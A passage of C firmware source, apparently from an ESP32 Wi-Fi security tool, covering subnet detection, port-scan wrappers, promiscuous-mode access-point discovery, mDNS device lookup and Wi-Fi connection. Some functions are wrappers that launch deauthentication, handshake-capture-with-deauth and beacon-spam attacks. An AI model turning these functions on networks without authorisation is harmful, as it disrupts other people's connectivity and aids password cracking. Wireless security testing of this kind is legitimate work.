        TERMINAL_VIEW_ADD_TEXT("Failed to get IP info\n");
        return false;
    }

    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    struct in_addr network_addr;
    network_addr.s_addr = network;

    char *network_str = inet_ntoa(network_addr);
    char *last_dot = strrchr(network_str, '.');
    if (last_dot == NULL) {
        printf("Invalid network address format\n");
        TERMINAL_VIEW_ADD_TEXT("Invalid network address format\n");
        return false;
    }

    size_t prefix_len = last_dot - network_str + 1;
    memcpy(ctx->subnet_prefix, network_str, prefix_len);
    ctx->subnet_prefix[prefix_len] = '\0';

    printf("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    return true;
}

// Wrapper function that delegates to arp_scan module
bool wifi_manager_arp_scan_subnet(void) {
    return arp_scan_subnet();
}

// Wrapper function that delegates to port_scan module
void scan_ports_on_host(const char *target_ip, host_result_t *result) {
    // Cast host_result_t to port_scan_result_t since they have the same structure
    port_scan_scan_tcp_ports(target_ip, (port_scan_result_t *)result);
}

// Wrapper function that delegates to port_scan module
void scan_udp_ports_on_host(const char *target_ip, host_result_t *result) {
    // Cast host_result_t to port_scan_result_t since they have the same structure
    port_scan_scan_udp_ports(target_ip, (port_scan_result_t *)result);
}

// Wrapper function that delegates to port_scan module
bool scan_ip_udp_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
    return port_scan_udp_ip_range(target_ip, start_port, end_port);
}

// Wrapper function that delegates to port_scan module
void scan_ssh_on_host(const char *target_ip, host_result_t *result) {
    // Cast host_result_t to port_scan_result_t since they have the same structure
    port_scan_ssh(target_ip, (port_scan_result_t *)result);
}

// Wrapper function that delegates to port_scan module
bool wifi_manager_scan_subnet() {
    return port_scan_subnet();
}

// Wrapper function that delegates to port_scan module
bool scan_ip_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
    return port_scan_ip_range(target_ip, start_port, end_port);
}

void wifi_manager_scan_for_open_ports() { wifi_manager_scan_subnet(); }

void rgb_visualizer_server_task(void *pvParameters) {
    char rx_buffer[MAX_PAYLOAD];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (1) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(UDP_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            printf("Unable to create socket: errno %d\n", errno);
            break;
        }
        printf("Socket created\n");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            printf("Socket unable to bind: errno %d\n", errno);
        }
        printf("Socket bound, port %d\n", UDP_PORT);

        while (1) {
            printf("Waiting for data\n");
            struct sockaddr_in6 source_addr;
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                               (struct sockaddr *)&source_addr, &socklen);

            if (len < 0) {
                printf("recvfrom failed: errno %d\n", errno);
                break;
            } else {
                // Data received
                rx_buffer[len] = 0; // Null-terminate

                // Process the received data
                uint8_t *amplitudes = (uint8_t *)rx_buffer;
                size_t num_bars = len;
                update_led_visualizer(amplitudes, num_bars, false);
            }
        }

        if (sock != -1) {
            printf("Shutting down socket and restarting...\n");
            shutdown(sock, 0);
            close(sock);
        }
    }

    vTaskDelete(NULL);
}

// Auto deauth function - wrapper for deauth_attack module
void wifi_manager_auto_deauth() {
    deauth_attack_auto();
}

// Stop deauth function - wrapper for deauth_attack module
void wifi_manager_stop_deauth() {
    deauth_attack_stop();
}

// Handshake + Deauth combined attack wrappers
void wifi_manager_start_handshake_deauth() {
    deauth_attack_start_handshake_deauth();
}

bool wifi_manager_stop_handshake_deauth() {
    return deauth_attack_stop_handshake_deauth();
}

bool wifi_manager_handshake_deauth_is_running() {
    return deauth_attack_handshake_deauth_is_running();
}

static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
    char sanitized_ssid[33];
    sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));

    // lookup vendor using oui database
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             rec->bssid[0], rec->bssid[1], rec->bssid[2],
             rec->bssid[3], rec->bssid[4], rec->bssid[5]);
    char vendor[64] = {0};
    bool has_vendor = ouis_lookup_vendor(mac_str, vendor, sizeof(vendor));

    printf("[%u] SSID: %s,\n"
           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
           "     RSSI: %d,\n"
           "     Channel: %d,\n",
           idx,
           sanitized_ssid,
           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
           rec->rssi,
           rec->primary);
    TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
                           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
                           "     RSSI: %d,\n"
                           "     Channel: %d,\n",
                           idx,
                           sanitized_ssid,
                           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
                           rec->rssi,
                           rec->primary);

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
    if (include_security) {
        int ch = rec->primary;
        const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
        printf("     Band: %s,\n", band_str);
        TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);

        const char *auth_str = "Unknown";
        const char *pmf_str = NULL;
        switch (rec->authmode) {
            case WIFI_AUTH_OPEN: auth_str = "Open"; break;
            case WIFI_AUTH_WEP: auth_str = "WEP"; break;
            case WIFI_AUTH_WPA_PSK: auth_str = "WPA"; break;
            case WIFI_AUTH_WPA2_PSK: auth_str = "WPA2"; break;
            case WIFI_AUTH_WPA_WPA2_PSK: auth_str = "WPA/WPA2"; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: auth_str = "WPA2-Enterprise"; break;
            case WIFI_AUTH_WPA3_PSK: auth_str = "WPA3"; pmf_str = "Required"; break;
            case WIFI_AUTH_WPA2_WPA3_PSK: auth_str = "WPA2/WPA3"; pmf_str = "Required (WPA3)"; break;
            case WIFI_AUTH_WAPI_PSK: auth_str = "WAPI"; break;
            case WIFI_AUTH_WPA3_ENTERPRISE: auth_str = "WPA3-Enterprise"; pmf_str = "Required"; break;
            default: auth_str = "Unknown"; break;
        }
        if (pmf_str) {
            printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
        } else {
            printf("     Security: %s\n", auth_str);
            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n", auth_str);
        }
    }
#endif

    if (has_vendor) {
        printf("     Vendor: %s\n", vendor);
        TERMINAL_VIEW_ADD_TEXT("     Vendor: %s\n", vendor);
    }
}
void wifi_manager_print_scan_results_with_oui() {
    if (scanned_aps == NULL) {
        glog("AP information not available\n");
        return;
    }

    scan_file_t sf = SCAN_FILE_INIT;
    bool saving = (scan_file_open(&sf, "ap_scan", "txt") == ESP_OK);

    uint16_t limit = ap_count;

    if (saving) {
        scan_file_printf(&sf, "--- AP Scan Results (%u APs) ---\n", limit);
    }

    for (uint16_t i = 0; i < limit; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5]);
        char vendor[64] = {0};
        bool has_vendor = ouis_lookup_vendor(mac_str, vendor, sizeof(vendor));

        glog("[%u] SSID: %s,\n"
             "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
             "     RSSI: %d,\n"
             "     Channel: %d,\n",
             i, sanitized_ssid, 
             scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
             scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
             scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
             scanned_aps[i].rssi,
             scanned_aps[i].primary);

        if (saving) {
            scan_file_printf(&sf, "[%u] SSID: %s, BSSID: %s, RSSI: %d, CH: %d",
                             i, sanitized_ssid, mac_str,
                             scanned_aps[i].rssi, scanned_aps[i].primary);
        }

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        {
            int ch = scanned_aps[i].primary;
            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
            glog("     Band: %s,\n", band_str);
            
            const char *auth_str = "Unknown";
            const char *pmf_str = NULL;
            
            switch (scanned_aps[i].authmode) {
                case WIFI_AUTH_OPEN:
                    auth_str = "Open";
                    break;
                case WIFI_AUTH_WEP:
                    auth_str = "WEP";
                    break;
                case WIFI_AUTH_WPA_PSK:
                    auth_str = "WPA";
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    auth_str = "WPA2";
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    auth_str = "WPA/WPA2";
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    auth_str = "WPA2-Enterprise";
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    auth_str = "WPA3";
                    pmf_str = "Required";
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    auth_str = "WPA2/WPA3";
                    pmf_str = "Required (WPA3)";
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    auth_str = "WAPI";
                    break;
                case WIFI_AUTH_WPA3_ENTERPRISE:
                    auth_str = "WPA3-Enterprise";
                    pmf_str = "Required";
                    break;
                default:
                    auth_str = "Unknown";
                    break;
            }
            
            if (pmf_str) {
                glog("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
            } else {
                glog("     Security: %s\n", auth_str);
            }
            if (saving) {
                scan_file_printf(&sf, ", Band: %s, Security: %s", band_str, auth_str);
                if (pmf_str) scan_file_printf(&sf, ", PMF: %s", pmf_str);
            }
        }
#endif
        if (has_vendor) {
            glog("     Vendor: %s\n", vendor);
            if (saving) scan_file_printf(&sf, ", Vendor: %s", vendor);
        }
        if (saving) scan_file_printf(&sf, "\n");
    }

    if (saving) scan_file_close(&sf);
}

static void live_ap_channel_hop_timer_callback(void *arg) {
    if (!live_ap_hopping_active) return;
    size_t len = live_ap_active_channels_len;
    if (len == 0) return;
    live_ap_channel_index = (live_ap_channel_index + 1) % len;
    esp_wifi_set_channel(live_ap_active_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
}

static esp_err_t start_live_ap_channel_hopping(void) {
    if (live_ap_channel_hop_timer != NULL) {
        esp_timer_stop(live_ap_channel_hop_timer);
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
    }

    // User hop profile overrides the compile-time live AP table.
    size_t profile_count = 0;
    hop_profile_resolve(live_ap_profile_channels, WIFI_CHANNELS_MAX, &profile_count);
    if (profile_count > 0) {
        live_ap_active_channels = live_ap_profile_channels;
        live_ap_active_channels_len = profile_count;
    } else {
        live_ap_active_channels = live_ap_channels;
        live_ap_active_channels_len = live_ap_channels_len;
    }

    live_ap_channel_index = 0;
    esp_wifi_set_channel(live_ap_active_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
    esp_timer_create_args_t timer_args = {
        .callback = live_ap_channel_hop_timer_callback,
        .name = "live_ap_hop"
    };
    esp_err_t err = esp_timer_create(&timer_args, &live_ap_channel_hop_timer);
    if (err != ESP_OK) return err;
    err = esp_timer_start_periodic(live_ap_channel_hop_timer, WIRESHARK_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
        return err;
    }
    live_ap_hopping_active = true;
    return ESP_OK;
}

static void stop_live_ap_channel_hopping(void) {
    if (live_ap_channel_hop_timer) {
        esp_timer_stop(live_ap_channel_hop_timer);
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
    }
    live_ap_hopping_active = false;
}

static bool bssid_already_listed(const uint8_t *bssid) {
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, bssid, 6) == 0) return true;
    }
    return false;
}
static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 36) return;
    const uint8_t *payload = pkt->payload;
    uint8_t frame_subtype = (payload[0] & 0xF0) >> 4;
    if (frame_subtype != 0x08 && frame_subtype != 0x05) return;

    const wifi_ieee80211_packet_t *ipkt = (const wifi_ieee80211_packet_t *)payload;
    wifi_ieee80211_mac_hdr_t hdr_copy;
    memcpy(&hdr_copy, &ipkt->hdr, sizeof(hdr_copy));
    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;
    const uint8_t *bssid = hdr->addr3;

    if (bssid_already_listed(bssid)) return;

    int idx = 36;
    char ssid[33] = {0};
    while (idx + 1 < pkt->rx_ctrl.sig_len) {
        uint8_t id = payload[idx];
        uint8_t ie_len = payload[idx + 1];
        if (idx + 2 + ie_len > pkt->rx_ctrl.sig_len) break;
        if (id == 0 && ie_len <= 32) {
            memcpy(ssid, &payload[idx + 2], ie_len);
            ssid[ie_len] = '\0';
            break;
        }
        idx += 2 + ie_len;
    }

    if (ssid[0] == '\0') {
        strncpy(ssid, "<hidden>", sizeof(ssid));
    }

    char sanitized[33];
    sanitize_ssid_and_check_hidden((uint8_t *)ssid, sanitized, sizeof(sanitized));

    // derive security from IEs
    bool has_wpa = false;
    bool has_wpa2 = false;
    bool has_wpa3 = false;
    // capability info privacy bit for WEP detection
    if (pkt->rx_ctrl.sig_len >= 36) {
        uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
        // iterate IEs to find RSN/WPA
        int ie = 36;
        while (ie + 1 < pkt->rx_ctrl.sig_len) {
            uint8_t eid = payload[ie];
            uint8_t elen = payload[ie + 1];
            if (ie + 2 + elen > pkt->rx_ctrl.sig_len) break;
            if (eid == 48 /* RSN */ && elen >= 2) {
                int off = ie + 2;
                if (off + 2 <= ie + 2 + elen) {
                    off += 2; // version
                }
                if (off + 4 <= ie + 2 + elen) {
                    off += 4; // group cipher suite
                }
                if (off + 2 <= ie + 2 + elen) {
                    uint16_t pairwise_count = payload[off] | (payload[off + 1] << 8);
                    off += 2 + 4 * pairwise_count;
                }
                if (off + 2 <= ie + 2 + elen) {
                    uint16_t akm_count = payload[off] | (payload[off + 1] << 8);
                    off += 2;
                    for (uint16_t a = 0; a < akm_count; a++) {
                        if (off + 4 > ie + 2 + elen) break;
                        // OUI 00:0F:AC
                        uint8_t oui0 = payload[off + 0];
                        uint8_t oui1 = payload[off + 1];
                        uint8_t oui2 = payload[off + 2];
                        uint8_t type = payload[off + 3];
                        if (oui0 == 0x00 && oui1 == 0x0F && oui2 == 0xAC) {
                            if (type == 2) has_wpa2 = true;      // PSK
                            if (type == 8) has_wpa3 = true;      // SAE
                        }
                        off += 4;
                    }
                }
            } else if (eid == 221 /* Vendor */ && elen >= 4) {
                // WPA (00:50:F2, type 1)
                if (payload[ie + 2] == 0x00 && payload[ie + 3] == 0x50 && payload[ie + 4] == 0xF2 && payload[ie + 5] == 0x01) {
                    has_wpa = true;
                }
            }
            ie += 2 + elen;
        }
    }

    if (scanned_aps == NULL) {
        scanned_aps = calloc(MAX_SCANNED_APS, sizeof(wifi_ap_record_t));
        ap_count = 0;
    }
    if (scanned_aps && ap_count < MAX_SCANNED_APS) {
        wifi_ap_record_t *rec = &scanned_aps[ap_count++];
        memset(rec, 0, sizeof(*rec));
        memcpy(rec->bssid, bssid, 6);
        strncpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
        rec->rssi = pkt->rx_ctrl.rssi;
        rec->primary = pkt->rx_ctrl.channel;
        // map to closest auth mode
        if (has_wpa3 && has_wpa2) rec->authmode = WIFI_AUTH_WPA2_WPA3_PSK;
        else if (has_wpa3) rec->authmode = WIFI_AUTH_WPA3_PSK;
        else if (has_wpa2) rec->authmode = WIFI_AUTH_WPA2_PSK;
        else if (has_wpa) rec->authmode = WIFI_AUTH_WPA_PSK;
        else {
            // check WEP via privacy bit
            uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
            if (cap & 0x0010) rec->authmode = WIFI_AUTH_WEP; else rec->authmode = WIFI_AUTH_OPEN;
        }
        char ap_payload[96];
        snprintf(ap_payload, sizeof(ap_payload), "%02x:%02x:%02x:%02x:%02x:%02x|%d|%d",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            rec->primary, rec->rssi);
        ghostscript_emit_event("wifi_ap_found", ap_payload);
    }

    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
    if (now_ms - last_live_print_ms < 100) return;
    last_live_print_ms = now_ms;

    while (live_last_printed_index < ap_count) {
        uint16_t idx = live_last_printed_index;
        wifi_ap_record_t *rec = &scanned_aps[idx];
        wifi_manager_print_ap_entry_formatted(idx, rec, true);
        live_last_printed_index++;
    }
}

void wifi_manager_start_live_ap_scan(void) {
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    if (scanned_aps) { free(scanned_aps); scanned_aps = NULL; }
    ap_count = 0;
    live_last_printed_index = 0;
    last_live_print_ms = 0;
    wifi_manager_start_monitor_mode(live_ap_scan_callback);
    start_live_ap_channel_hopping();
    printf("Live AP scan started. Type 'stopscan' to stop.\n");
    TERMINAL_VIEW_ADD_TEXT("Live AP scan started.\n");
}

// Beacon spam functions are now in attacks/wifi/beacon_spam.c
// Wrapper functions to maintain API compatibility

esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
    return beacon_spam_broadcast(ssid);
}

void wifi_manager_stop_beacon() {
    beacon_spam_stop();
}

void wifi_manager_start_ip_lookup() {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
        printf("Not connected to an Access Point.\n");
        return;
    }

    g_mdns_result_count = 0;
    bool store_results = (g_mdns_results != NULL);
    bool was_running = g_mdns_scan_running;
    g_mdns_scan_running = true;

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) ==
        ESP_OK) {
        printf("Connected. Proceeding with IP lookup...\n");

        for (int s = 0; s < NUM_SERVICES; s++) {
            if (!g_mdns_scan_running) break;

            int retries = 0;
            mdns_result_t *mdnsresult = NULL;

            while (retries < 5 && mdnsresult == NULL && g_mdns_scan_running) {
                mdns_query_ptr(services[s].query, "_tcp", 2000, 30, &mdnsresult);
                if (mdnsresult == NULL) {
                    retries++;
                    printf("Retrying mDNS query for service: %s (Attempt %d)\n",
                           services[s].query, retries);
                    vTaskDelay(pdMS_TO_TICKS(500));
                }
            }

            if (mdnsresult != NULL) {
                printf("mDNS query succeeded for service: %s\n", services[s].query);

                mdns_result_t *current_result = mdnsresult;
                while (current_result != NULL) {
                    char ip_str[INET_ADDRSTRLEN] = {0};
                    mdns_ip_addr_t *addr_item = current_result->addr;
                    bool has_v4 = false;
                    while (addr_item != NULL) {
                        if (addr_item->addr.type == IPADDR_TYPE_V4) {
                            inet_ntop(AF_INET, &addr_item->addr.u_addr.ip4, ip_str, INET_ADDRSTRLEN);
                            has_v4 = true;
                            break;
                        }
                        addr_item = addr_item->next;
                    }
                    if (!has_v4) {
                        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
                    }

                    if (store_results && g_mdns_result_count < MDNS_MAX_DEVICES) {
                        bool duplicate = false;
                        for (int d = 0; d < g_mdns_result_count; d++) {
                            if (strcmp(g_mdns_results[d].ip, ip_str) == 0) {
                                duplicate = true;
                                break;
                            }
                        }
                        if (!duplicate) {
                            mdns_device_t *dev = &g_mdns_results[g_mdns_result_count];
                            memset(dev, 0, sizeof(mdns_device_t));
                            if (current_result->hostname) {
                                strncpy(dev->hostname, current_result->hostname, sizeof(dev->hostname) - 1);
                            }
                            strncpy(dev->ip, ip_str, sizeof(dev->ip) - 1);
                            dev->port = current_result->port;
                            strncpy(dev->service_type, services[s].type, sizeof(dev->service_type) - 1);
                            g_mdns_result_count++;
                        }
                    }

                    printf("Device at: %s\n", ip_str);
                    printf("  Name: %s\n", current_result->hostname);
                    printf("  Type: %s\n", services[s].type);
                    printf("  Port: %u\n", current_result->port);

                    current_result = current_result->next;
                }

                mdns_query_results_free(mdnsresult);
            } else {
                printf("Failed to find devices for service: %s after %d retries\n",
                       services[s].query, retries);
            }
        }
    } else {
        printf("Can't get network interface info.\n");
    }

    printf("IP Scan Done. Found %d devices.\n", g_mdns_result_count);
    if (!was_running) {
        g_mdns_scan_running = false;
    }
}

static void wifi_manager_ip_lookup_task(void *pvParameters) {
    (void)pvParameters;
    wifi_manager_start_ip_lookup();
    g_mdns_scan_done = true;
    vTaskDelete(NULL);
}

esp_err_t wifi_manager_start_ip_lookup_async(void) {
    if (g_mdns_scan_running) {
        return ESP_ERR_INVALID_STATE;
    }
    wifi_manager_ip_lookup_clear();
    g_mdns_results = malloc(sizeof(mdns_device_t) * MDNS_MAX_DEVICES);
    if (!g_mdns_results) {
        return ESP_ERR_NO_MEM;
    }
    memset(g_mdns_results, 0, sizeof(mdns_device_t) * MDNS_MAX_DEVICES);
    g_mdns_scan_running = true;
    g_mdns_scan_done = false;
    BaseType_t ret = xTaskCreate(wifi_manager_ip_lookup_task, "mdns_scan", 8192, NULL, 5, NULL);
    if (ret != pdPASS) {
        g_mdns_scan_running = false;
        free(g_mdns_results);
        g_mdns_results = NULL;
        return ESP_FAIL;
    }
    return ESP_OK;
}

bool wifi_manager_ip_lookup_check_done(void) {
    return g_mdns_scan_done;
}

void wifi_manager_ip_lookup_finish_async(void) {
    g_mdns_scan_running = false;
}

bool wifi_manager_ip_lookup_is_running(void) {
    return g_mdns_scan_running && !g_mdns_scan_done;
}

int wifi_manager_ip_lookup_get_count(void) {
    return g_mdns_result_count;
}

const mdns_device_t* wifi_manager_ip_lookup_get_device(int index) {
    if (index < 0 || index >= g_mdns_result_count) {
        return NULL;
    }
    return &g_mdns_results[index];
}

void wifi_manager_ip_lookup_clear(void) {
    g_mdns_result_count = 0;
    if (g_mdns_results) {
        free(g_mdns_results);
        g_mdns_results = NULL;
    }
}
void wifi_manager_connect_wifi(const char *ssid, const char *password) {
    if (ssid == NULL || ssid[0] == '\0') {
        printf("No SSID provided\n");
        TERMINAL_VIEW_ADD_TEXT("No SSID provided\n");
        status_display_show_status("WiFi No SSID");
        return;
    }

    wifi_reconnect_reset();

    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
        ESP_LOGE(TAG, "connect: wifi ctrl mutex lock failed");
        TERMINAL_VIEW_ADD_TEXT("WiFi busy, try again\n");
        status_display_show_status("WiFi Busy");
        return;
    }

    printf("Connecting to WiFi: %s\n", ssid);
    TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
    status_display_show_status("WiFi Connecting...");
    wifi_connect_cancel_requested = false;

    wifi_ap_record_t current_ap = {0};
#if CONFIG_IDF_TARGET_ESP32P4
    esp_netif_ip_info_t current_ip = {0};
    bool has_ip = wifiSTA && esp_netif_is_netif_up(wifiSTA) &&
                  esp_netif_get_ip_info(wifiSTA, &current_ip) == ESP_OK &&
                  current_ip.ip.addr != 0;
#endif
    if (esp_wifi_sta_get_ap_info(&current_ap) == ESP_OK &&
        strncmp((const char *)current_ap.ssid, ssid, sizeof(current_ap.ssid)) == 0
#if CONFIG_IDF_TARGET_ESP32P4
        && has_ip
#endif
        ) {
        printf("Already connected to %s\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("Already connected to %s\n", ssid);
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
        status_display_show_status("WiFi Connected");
        wifi_ctrl_unlock();
        return;
    }
    
    wifi_config_t wifi_config = {0};
    
    // Copy SSID and password safely
    strlcpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strlcpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));
    
    // Set auth mode - use WPA_WPA2_PSK for better compatibility with modern routers
    if (strlen(password) > 0) {
        wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
        wifi_config.sta.pmf_cfg.capable = true;
        wifi_config.sta.pmf_cfg.required = false;
    } else {
        wifi_config.sta.threshold.authmode = WIFI_AUTH_OPEN;
    }
    
    // Enable scan method for better AP selection
    wifi_config.sta.scan_method = WIFI_FAST_SCAN;
    wifi_config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    
    // Ensure clean start state
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_CONNECTING_BIT);
    
    // Set the connecting bit BEFORE any WiFi operations
    xEventGroupSetBits(wifi_event_group, WIFI_CONNECTING_BIT);

    // Match the init policy: keep the AP half only when the SoftAP is enabled,
    // otherwise connect STA-only so the AP interface's internal RAM stays freed
    // during normal connected operation (this is the state Cloud Store runs in).
    wifi_mode_t connect_mode = settings_get_ap_enabled(&G_Settings) ? WIFI_MODE_APSTA : WIFI_MODE_STA;
    esp_err_t err = esp_wifi_set_mode(connect_mode);
    if (err != ESP_OK) {
        printf("Failed to set WiFi mode: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to set WiFi mode\n");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);
        status_display_show_status("WiFi Mode Fail");
        wifi_ctrl_unlock();
        return;
    }

    err = esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to configure STA: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to configure WiFi\n");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);
        status_display_show_status("WiFi Config Fail");
        wifi_ctrl_unlock();
        return;
    }

    err = esp_wifi_disconnect();
    if (err != ESP_OK && err != ESP_ERR_WIFI_NOT_CONNECT && err != ESP_ERR_WIFI_CONN) {
        ESP_LOGW(TAG, "connect: esp_wifi_disconnect returned %s", esp_err_to_name(err));
    }

    err = esp_wifi_start();
    if (err != ESP_OK && err != ESP_ERR_WIFI_CONN) {
        printf("Failed to start WiFi: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to start WiFi\n");
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);
        status_display_show_status("WiFi Start Fail");
        wifi_ctrl_unlock();
        return;
    }

    wifi_ctrl_unlock();

    vTaskDelay(pdMS_TO_TICKS(150));

    int retry_count = 0;
    const int max_retries = 5;  // Reduced retry count for cleaner logs
    bool connected = false;

    while (retry_count < max_retries && !connected) {
        if (wifi_connect_cancel_requested) {
            TERMINAL_VIEW_ADD_TEXT("WiFi connection cancelled\n");
            printf("WiFi connection cancelled\n");
            break;
        }

        if (retry_count > 0) {
            printf("Retry attempt %d/%d...\n", retry_count, max_retries);
            TERMINAL_VIEW_ADD_TEXT("Retry attempt %d/%d...\n", retry_count, max_retries);
        }
        
        esp_err_t ret = esp_wifi_connect();
        if (ret == ESP_ERR_WIFI_CONN) {
            ret = ESP_OK; // Already connecting, handled elsewhere
        } else if (ret == ESP_ERR_WIFI_NOT_STARTED) {
            esp_err_t start_err = esp_wifi_start();
            if (start_err == ESP_OK || start_err == ESP_ERR_WIFI_CONN) {
                vTaskDelay(pdMS_TO_TICKS(150));
                ret = esp_wifi_connect();
                if (ret == ESP_ERR_WIFI_CONN) {
                    ret = ESP_OK;
                }
            }
        }

        if (ret == ESP_OK) {
            EventBits_t bits = 0;
            const TickType_t wait_slice = pdMS_TO_TICKS(250);
            const TickType_t wait_total = pdMS_TO_TICKS(10000);
            TickType_t waited = 0;

            while (!wifi_connect_cancel_requested && waited < wait_total) {
                bits = xEventGroupWaitBits(wifi_event_group,
                                           WIFI_CONNECTED_BIT,
                                           pdFALSE,
                                           pdTRUE,
                                           wait_slice);
                if (bits & WIFI_CONNECTED_BIT) {
                    break;
                }
                waited += wait_slice;
            }

            if (wifi_connect_cancel_requested) {
                TERMINAL_VIEW_ADD_TEXT("WiFi connection cancelled\n");
                printf("WiFi connection cancelled\n");
                break;
            }
            
            if (bits & WIFI_CONNECTED_BIT) {
                connected = true;
                printf("Successfully connected to %s\n", ssid);
                TERMINAL_VIEW_ADD_TEXT("Successfully connected to %s\n", ssid);
                break;
            }
        } else {
            printf("Connection initiation failed (error: %d)\n", ret);
            TERMINAL_VIEW_ADD_TEXT("Connection initiation failed (error: %d)\n", ret);
        }

        if (!connected) {
            esp_wifi_disconnect();
            retry_count++;
            if (retry_count < max_retries) {
                TERMINAL_VIEW_ADD_TEXT("Retrying connection (%d/%d)...\n", retry_count, max_retries);
                vTaskDelay(pdMS_TO_TICKS(3000));
            }
        }
    }

    // Clear the connecting bit as we're done with the manual connection attempt
